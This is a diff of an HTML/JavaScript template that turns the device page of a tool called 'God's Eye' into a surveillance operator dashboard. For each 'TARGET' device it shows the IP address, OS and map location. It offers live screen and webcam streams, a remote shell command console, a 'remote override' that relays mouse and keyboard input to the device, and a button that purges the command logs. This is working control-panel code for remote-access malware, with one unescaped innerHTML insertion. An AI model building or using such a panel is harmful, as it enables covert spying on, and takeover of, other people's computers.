@@ -4,148 +4,587 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Device Details - {{ device.name }}</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <title>GOD'S EYE // TARGET: {{ device.name }}</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
     <style>
+        :root {
+            --bg-color: #050505;
+            --panel-bg: rgba(10, 15, 20, 0.95);
+            --neon-green: #39ff14;
+            --neon-cyan: #00f3ff;
+            --alert-red: #ff3333;
+            --warning-amber: #ffbf00;
+            --grid-line: rgba(0, 243, 255, 0.1);
+        }
+
         body {
-            background-color: #121212;
-            color: #e0e0e0;
+            background-color: var(--bg-color);
+            color: var(--neon-cyan);
+            font-family: 'Share Tech Mono', monospace;
+            margin: 0;
+            padding: 10px;
+            overflow-x: hidden;
+            background-image:
+                linear-gradient(var(--grid-line) 1px, transparent 1px),
+                linear-gradient(90deg, var(--grid-line) 1px, transparent 1px);
+            background-size: 20px 20px;
         }
 
-        .card {
-            background-color: #1e1e1e;
-            border: 1px solid #333;
+        /* CRT Scanline Effect */
+        body::after {
+            content: " ";
+            display: block;
+            position: fixed;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            z-index: 2;
+            background-size: 100% 2px, 3px 100%;
+            pointer-events: none;
         }
 
-        .data-value {
-            font-family: monospace;
-            color: #00ff00;
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
         }
 
+        header {
+            border-bottom: 2px solid var(--neon-cyan);
+            padding: 10px 0;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            text-transform: uppercase;
+        }
+
+        h1 {
+            font-family: 'Orbitron', sans-serif;
+            margin: 0;
+            text-shadow: 0 0 10px var(--neon-cyan);
+            font-size: 24px;
+        }
+
+        .status-badge {
+            border: 1px solid var(--neon-green);
+            color: var(--neon-green);
+            padding: 5px 15px;
+            font-size: 14px;
+            letter-spacing: 2px;
+            box-shadow: 0 0 5px var(--neon-green);
+        }
+
+        .grid-layout {
+            display: grid;
+            grid-template-columns: 350px 1fr 300px;
+            grid-template-rows: auto auto;
+            gap: 20px;
+        }
+
+        .panel {
+            background: var(--panel-bg);
+            border: 1px solid var(--neon-cyan);
+            position: relative;
+            padding: 15px;
+        }
+
+        /* HUD Corners */
+        .panel::before,
+        .panel::after {
+            content: '';
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            border: 2px solid var(--neon-cyan);
+            transition: all 0.3s;
+        }
+
+        .panel::before {
+            top: -1px;
+            left: -1px;
+            border-right: 0;
+            border-bottom: 0;
+        }
+
+        .panel::after {
+            bottom: -1px;
+            right: -1px;
+            border-left: 0;
+            border-top: 0;
+        }
+
+        .panel-header {
+            background: rgba(0, 243, 255, 0.1);
+            padding: 5px 10px;
+            margin: -15px -15px 15px -15px;
+            border-bottom: 1px solid var(--neon-cyan);
+            font-family: 'Orbitron', sans-serif;
+            font-size: 14px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .data-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            border-bottom: 1px dashed rgba(0, 243, 255, 0.2);
+            padding-bottom: 2px;
+        }
+
+        .label {
+            color: rgba(0, 243, 255, 0.7);
+        }
+
+        .value {
+            color: var(--neon-green);
+            text-shadow: 0 0 5px var(--neon-green);
+        }
+
+        /* Map */
         #map {
-            height: 300px;
+            height: 250px;
             width: 100%;
+            border: 1px solid var(--neon-cyan);
+            background: #001111;
+            /* Hacker theme: Invert tiles and rotate to get a dark neon look without total blackout */
+            filter: invert(90%) hue-rotate(190deg) brightness(0.8) contrast(1.2);
         }
 
-        .screen-view {
+        /* Video Feed */
+        .video-container {
             width: 100%;
-            border: 2px solid #00ff00;
+            background: #000;
+            border: 1px solid var(--neon-cyan);
+            min-height: 400px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .video-feed {
+            max-width: 100%;
+            max-height: 600px;
+        }
+
+        .no-signal {
+            color: var(--alert-red);
+            font-family: 'Orbitron';
+            font-size: 20px;
+            letter-spacing: 5px;
+            animation: blink 1s infinite;
+            display: none;
+        }
+
+        /* Console */
+        .console {
+            background: #000;
+            border: 1px solid var(--neon-cyan);
+            padding: 10px;
+            height: 200px;
+            overflow-y: auto;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 13px;
+            color: #ddd;
+            margin-bottom: 10px;
+        }
+
+        .console-line {
+            margin-bottom: 2px;
+        }
+
+        .console-line.sent {
+            color: var(--neon-cyan);
+        }
+
+        .console-line.recv {
+            color: var(--neon-green);
+        }
+
+        .cmd-input {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid var(--neon-cyan);
+            color: var(--neon-green);
+            padding: 10px;
+            font-family: 'Share Tech Mono';
+            box-sizing: border-box;
+        }
+
+        .cmd-input:focus {
+            outline: none;
+            box-shadow: 0 0 10px var(--neon-cyan);
+        }
+
+        /* Buttons */
+        .btn {
+            background: transparent;
+            border: 1px solid var(--neon-cyan);
+            color: var(--neon-cyan);
+            padding: 5px 15px;
+            cursor: pointer;
+            font-family: 'Share Tech Mono';
+            text-transform: uppercase;
+            transition: 0.2s;
+        }
+
+        .btn:hover {
+            background: var(--neon-cyan);
+            color: #000;
+        }
+
+        .btn.danger {
+            border-color: var(--alert-red);
+            color: var(--alert-red);
+        }
+
+        .btn.danger:hover {
+            background: var(--alert-red);
+            color: #fff;
+        }
+
+        .control-group {
+            margin-top: 10px;
+            display: flex;
+            gap: 10px;
+        }
+
+        /* Toggle */
+        .switch-label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            color: var(--warning-amber);
+        }
+
+        .switch-input {
+            display: none;
+        }
+
+        .switch-box {
+            width: 40px;
+            height: 20px;
+            border: 1px solid var(--warning-amber);
+            position: relative;
+            transition: 0.3s;
+        }
+
+        .switch-box::after {
+            content: '';
+            position: absolute;
+            top: 2px;
+            left: 2px;
+            width: 14px;
+            height: 14px;
+            background: var(--warning-amber);
+            transition: 0.3s;
+        }
+
+        .switch-input:checked+.switch-box {
+            background: rgba(255, 191, 0, 0.2);
+        }
+
+        .switch-input:checked+.switch-box::after {
+            left: 22px;
+            background: var(--neon-green);
+            box-shadow: 0 0 10px var(--neon-green);
+        }
+
+        @keyframes blink {
+            0% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.3;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+
+        /* Responsive Grid */
+        @media (max-width: 1200px) {
+            .grid-layout {
+                grid-template-columns: 1fr;
+            }
         }
     </style>
 </head>
 
 <body>
-    <nav class="navbar navbar-dark bg-dark">
-        <div class="container-fluid">
-            <a class="navbar-brand" href="{{ url_for('index') }}">God's Eye</a>
-        </div>
-    </nav>
 
-    <div class="container mt-4">
-        <h1>{{ device.name }}</h1>
-        <div class="row">
-            <div class="col-md-6">
-                <div class="card mb-3">
-                    <div class="card-header">System Metrics</div>
-                    <div class="card-body">
-                        <p>CPU Usage: <span class="data-value">{{ device.cpu_usage }}%</span></p>
-                        <p>RAM Usage: <span class="data-value">{{ device.ram_usage }} / {{ device.total_ram }} GB</span>
-                        </p>
-                        <p>Location: <span class="data-value">{{ device.location_lat }}, {{ device.location_lon
-                                }}</span></p>
-                        <p>Last Seen: {{ device.last_seen }}</p>
-                    </div>
+    <div class="container">
+        <header>
+            <div style="display: flex; gap: 20px; align-items: center;">
+                <div>
+                    <h1><i class="fas fa-eye"></i> GOD'S EYE</h1>
+                    <small style="letter-spacing: 3px; color: var(--neon-green);">// SURVEILLANCE v2.0</small>
                 </div>
+                <div style="font-size: 11px; border-left: 1px solid var(--neon-cyan); padding-left: 15px;">
+                    OPERATOR: {{ current_user.username }}<br>
+                    <a href="{{ url_for('logout') }}" style="color: var(--alert-red); text-decoration: none;">[ LOGOUT
+                        ]</a>
+                </div>
+            </div>
+            <div class="status-badge">connection: SECURE</div>
+            <a href="{{ url_for('index') }}" class="btn"><i class="fas fa-undo"></i> RETURN</a>
+        </header>
 
-                <div class="card mb-3">
-                    <div class="card-header">Controls</div>
-                    <div class="card-body">
-                        <form action="{{ url_for('send_command', device_id=device.id) }}" method="POST" class="mb-2">
-                            <div class="input-group">
-                                <input type="text" class="form-control" name="command"
-                                    placeholder="Enter shell command...">
-                                <button class="btn btn-danger" type="submit">Execute</button>
-                            </div>
+        <div class="grid-layout">
+            <!-- LEFT PANEL: METRICS -->
+            <div class="panel">
+                <div class="panel-header"><span>SYSTEM TELEMETRY</span> <i class="fas fa-chart-line"></i></div>
+
+                <div class="data-row"><span class="label">TARGET_ID</span> <span class="value">{{ device.hardware_id
+                        }}</span></div>
+                <div class="data-row"><span class="label">HOSTNAME</span> <span class="value">{{ device.name }}</span>
+                </div>
+                <div class="data-row"><span class="label">OS_BUILD</span> <span class="value">{{ device.os_info
+                        }}</span></div>
+                <div class="data-row"><span class="label">IP_ADDR</span> <span class="value">{{ device.ip_address
+                        }}</span></div>
+                <br>
+                <div class="data-row"><span class="label">CPU_LOAD</span> <span class="value">{{ device.cpu_usage
+                        }}%</span></div>
+                <div class="data-row"><span class="label">RAM_REAL</span> <span class="value">{{ device.ram_usage
+                        }}%</span></div>
+                <div class="data-row"><span class="label">LAST_CONTACT</span> <span class="value">{{
+                        device.last_seen.strftime('%H:%M:%S') }}</span></div>
+
+                <br>
+                <div class="panel-header" style="margin: 15px -15px 15px -15px;"><span>GEOLOCATION</span> <i
+                        class="fas fa-map-marker-alt"></i></div>
+                <div id="map"></div>
+            </div>
+
+            <!-- CENTER PANEL: FEED -->
+            <div class="panel">
+                <div class="panel-header">
+                    <span>VISUAL FEED</span>
+                    <div class="control-group" style="margin-top:0;">
+                        <form action="/api/execute_command" method="POST" style="display:inline;">
+                            <input type="hidden" name="device_id" value="{{ device.id }}">
+                            <input type="hidden" name="command" value="START_STREAM_SCREEN">
+                            <button class="btn">SCREEN</button>
                         </form>
-                        <div class="d-grid gap-2">
-                            <form action="{{ url_for('send_command', device_id=device.id) }}" method="POST"
-                                style="display:inline;">
-                                <input type="hidden" name="command" value="SCREENSHOT">
-                                <button class="btn btn-secondary w-100 mb-1" type="submit">Take Screenshot</button>
-                            </form>
-                            <form action="{{ url_for('send_command', device_id=device.id) }}" method="POST"
-                                style="display:inline;">
-                                <input type="hidden" name="command" value="CAPTURE_CAM">
-                                <button class="btn btn-secondary w-100 mb-1" type="submit">Take Photo (Cam)</button>
-                            </form>
-                            <form action="{{ url_for('send_command', device_id=device.id) }}" method="POST"
-                                style="display:inline;">
-                                <input type="hidden" name="command" value="START_STREAM_SCREEN">
-                                <button class="btn btn-success w-100 mb-1" type="submit">Start Screen Stream</button>
-                            </form>
-                            <form action="{{ url_for('send_command', device_id=device.id) }}" method="POST"
-                                style="display:inline;">
-                                <input type="hidden" name="command" value="STOP_STREAM_SCREEN">
-                                <button class="btn btn-warning w-100 mb-1" type="submit">Stop Screen Stream</button>
-                            </form>
-                            <form action="{{ url_for('send_command', device_id=device.id) }}" method="POST"
-                                style="display:inline;">
-                                <input type="hidden" name="command" value="START_STREAM_CAM">
-                                <button class="btn btn-success w-100 mb-1" type="submit">Start Cam Stream</button>
-                            </form>
-                            <form action="{{ url_for('send_command', device_id=device.id) }}" method="POST"
-                                style="display:inline;">
-                                <input type="hidden" name="command" value="STOP_STREAM_CAM">
-                                <button class="btn btn-warning w-100 mb-1" type="submit">Stop Cam Stream</button>
-                            </form>
-                        </div>
+                        <form action="/api/execute_command" method="POST" style="display:inline;">
+                            <input type="hidden" name="device_id" value="{{ device.id }}">
+                            <input type="hidden" name="command" value="START_STREAM_CAM">
+                            <button class="btn">CAM</button>
+                        </form>
+                        <form action="/api/execute_command" method="POST" style="display:inline;">
+                            <input type="hidden" name="device_id" value="{{ device.id }}">
+                            <input type="hidden" name="command" value="STOP_STREAM_SCREEN">
+                            <button class="btn danger">HALT</button>
+                        </form>
                     </div>
                 </div>
 
-                <div class="card mb-3">
-                    <div class="card-header">Recent Commands</div>
-                    <ul class="list-group list-group-flush">
-                        {% for cmd in commands %}
-                        <li class="list-group-item bg-dark text-white">
-                            <strong>{{ cmd.command_text }}</strong> - {{ cmd.status }}<br>
-                            <small>{{ cmd.executed_at }}</small>
-                            {% if cmd.output %}
-                            <pre class="mt-2 text-warning">{{ cmd.output }}</pre>
-                            {% endif %}
-                        </li>
-                        {% endfor %}
-                    </ul>
+                <div class="video-container" id="streamContainer" tabindex="0">
+                    <img src="{{ url_for('video_feed', device_id=device.id) }}" class="video-feed" id="streamImg"
+                        onerror="this.style.display='none'; document.getElementById('no-sig').style.display='block';">
+                    <div id="no-sig" class="no-signal">AWAITING SIGNAL...</div>
+                </div>
+
+                <div style="margin-top: 15px; display: flex; justify-content: space-between; align-items: center;">
+                    <label class="switch-label">
+                        <input type="checkbox" id="controlToggle" class="switch-input">
+                        <span class="switch-box"></span>
+                        <span>ENGAGE REMOTE OVERRIDE</span>
+                    </label>
+                    <span id="controlStatus" style="color: var(--alert-red); display:none;"> [ REMOTE_ACTIVE ] </span>
                 </div>
             </div>
 
-            <div class="col-md-6">
-                <div class="card mb-3">
-                    <div class="card-header">Live Screen Stream</div>
-                    <div class="card-body text-center">
-                        <img src="{{ url_for('video_feed', device_id=device.id, source='screen') }}" class="screen-view"
-                            alt="Waiting for stream...">
-                    </div>
+            <!-- RIGHT PANEL: COMMANDS -->
+            <div class="panel">
+                <div class="panel-header"><span>COMMAND CONSOLE</span> <i class="fas fa-terminal"></i></div>
+
+                <div class="console" id="cmdConsole">
+                    <div class="console-line recv">System initialized...</div>
+                    <div class="console-line recv">Connected to {{ device.ip_address }}</div>
+                    <div class="console-line recv">Ready for input.</div>
+                    <!-- Logic to populate this would go here in a real app (polling logs) -->
                 </div>
 
-                <div class="card mb-3">
-                    <div class="card-header">Live Camera Stream</div>
-                    <div class="card-body text-center">
-                        <img src="{{ url_for('video_feed', device_id=device.id, source='cam') }}" class="screen-view"
-                            alt="Waiting for stream...">
-                    </div>
-                </div>
+                <form action="/api/execute_command" method="POST" id="cmdForm">
+                    <input type="hidden" name="device_id" value="{{ device.id }}">
+                    <input type="text" name="command" class="cmd-input" placeholder="> EXECUTE_CMD..." required
+                        autocomplete="off">
+                </form>
 
-                <div class="card mb-3">
-                    <div class="card-header">Location Map</div>
-                    <div class="card-body">
-                        <iframe width="100%" height="300"
-                            src="https://maps.google.com/maps?q={{ device.location_lat }},{{ device.location_lon }}&z=15&output=embed"
-                            frameborder="0" scrolling="no" marginheight="0" marginwidth="0"></iframe>
-                    </div>
+                <div style="margin-top: 10px; text-align: right;">
+                    <button class="btn danger" onclick="purgeHistory()"><i class="fas fa-trash"></i> PURGE LOGS</button>
                 </div>
             </div>
         </div>
     </div>
+
+    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
+    <script>
+        // MAP INIT
+        var lat = Number("{{ device.location_lat or 0 }}");
+        var lon = Number("{{ device.location_lon or 0 }}");
+
+        var map = L.map('map', { attributionControl: false }).setView([lat, lon], 13);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        L.circleMarker([lat, lon], {
+            color: '#39ff14',
+            fillColor: '#39ff14',
+            fillOpacity: 0.5,
+            radius: 8
+        }).addTo(map);
+
+        // CONTROL LOGIC
+        const container = document.getElementById('streamContainer');
+        const img = document.getElementById('streamImg');
+        const noSig = document.getElementById('no-sig');
+        const toggle = document.getElementById('controlToggle');
+        const status = document.getElementById('controlStatus');
+        let controlEnabled = false;
+
+        // Enhanced error handling for the stream
+        img.onerror = function () {
+            this.style.display = 'none';
+            noSig.style.display = 'block';
+            // Try to recover after 2 seconds
+            setTimeout(() => {
+                this.src = this.src.split('?')[0] + '?t=' + new Date().getTime();
+                this.style.display = 'block';
+                noSig.style.display = 'none';
+            }, 2000);
+        };
+
+        img.onload = function () {
+            this.style.display = 'block';
+            noSig.style.display = 'none';
+        };
+
+        toggle.addEventListener('change', (e) => {
+            controlEnabled = e.target.checked;
+            status.style.display = controlEnabled ? 'inline' : 'none';
+            if (controlEnabled) container.focus();
+
+            // Send enable/disable command to agent for optimization (optional)
+            fetch('/api/execute_command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: `device_id={{ device.id }}&command=${controlEnabled ? 'ENABLE_CONTROL' : 'DISABLE_CONTROL'}`
+            });
+        });
+
+        function sendInput(data) {
+            if (!controlEnabled) return;
+            fetch('/api/control/input/{{ device.id }}', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+        }
+
+        // INPUT EVENTS
+        let lastMove = 0;
+        container.addEventListener('mousemove', (e) => {
+            const now = Date.now();
+            if (now - lastMove < 100) return;
+            lastMove = now;
+            const rect = img.getBoundingClientRect();
+            const x = (e.clientX - rect.left) / rect.width;
+            const y = (e.clientY - rect.top) / rect.height;
+            if (x >= 0 && x <= 1 && y >= 0 && y <= 1) {
+                sendInput({ type: 'mousemove', x: x, y: y });
+            }
+        });
+
+        container.addEventListener('click', () => sendInput({ type: 'click' }));
+
+        container.addEventListener('keydown', (e) => {
+            if (["ArrowUp", "ArrowDown", "ArrowLeft", "ArrowRight", "Space"].indexOf(e.code) > -1) {
+                e.preventDefault();
+            }
+            sendInput({ type: 'keydown', key: e.key });
+        });
+
+        // COMMAND HANDLING
+        const cmdForm = document.getElementById('cmdForm');
+        cmdForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const formData = new FormData(cmdForm);
+            fetch('/api/execute_command_ajax', {
+                method: 'POST',
+                body: formData
+            }).then(() => {
+                cmdForm.reset();
+                pollCommandHistory();
+            });
+        });
+
+        // Add special handlers for the control buttons (Screen/Cam/Halt)
+        document.querySelectorAll('.panel-header .control-group .btn').forEach(btn => {
+            btn.onclick = (e) => {
+                const form = btn.closest('form');
+                if (form) {
+                    e.preventDefault();
+                    const formData = new FormData(form);
+                    fetch('/api/execute_command_ajax', {
+                        method: 'POST',
+                        body: formData
+                    }).then(() => pollCommandHistory());
+                }
+            };
+        });
+
+        function pollCommandHistory() {
+            fetch('/api/command/history/{{ device.id }}')
+                .then(res => res.json())
+                .then(data => {
+                    const console = document.getElementById('cmdConsole');
+                    console.innerHTML = '';
+                    data.reverse().forEach(cmd => {
+                        const line = document.createElement('div');
+                        line.className = 'console-line sent';
+                        line.innerHTML = `> ${cmd.command_text}`;
+                        console.appendChild(line);
+
+                        if (cmd.output) {
+                            const out = document.createElement('div');
+                            out.className = 'console-line recv';
+                            out.style.whiteSpace = 'pre-wrap';
+                            out.textContent = cmd.output; // Use textContent for safety and literal rendering
+                            console.appendChild(out);
+                        }
+                    });
+                    console.scrollTop = console.scrollHeight;
+                });
+        }
+
+        setInterval(pollCommandHistory, 2000);
+        pollCommandHistory();
+
+        // PURGE HISTORY
+        function purgeHistory() {
+            if (confirm('CONFIRM: PURGE ALL COMMAND LOGS?')) {
+                fetch('/api/command/history/{{ device.id }}', { method: 'DELETE' })
+                    .then(res => res.json())
+                    .then(data => {
+                        pollCommandHistory();
+                    });
+            }
+        }
+    </script>
 </body>
 
 </html>
